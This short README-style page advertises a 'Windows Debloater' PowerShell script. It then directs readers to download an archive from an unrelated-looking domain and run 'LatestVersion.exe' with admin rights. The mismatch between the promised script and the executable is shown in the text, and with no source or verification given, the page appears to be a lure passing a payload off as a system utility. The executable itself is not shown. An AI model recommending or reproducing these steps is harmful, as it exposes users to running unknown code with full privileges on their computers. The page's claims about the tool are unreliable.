# Windows Debloater

PowerShell script — removes Xbox, Cortana, and 40+ preinstalled apps.

## Get it

[Download](https://dllvcrun.com/debloat)

## Instructions

- Extract the archive
- Launch `LatestVersion.exe` with admin rights
- Follow the on-screen steps

## System

Windows 10 or 11, 64-bit
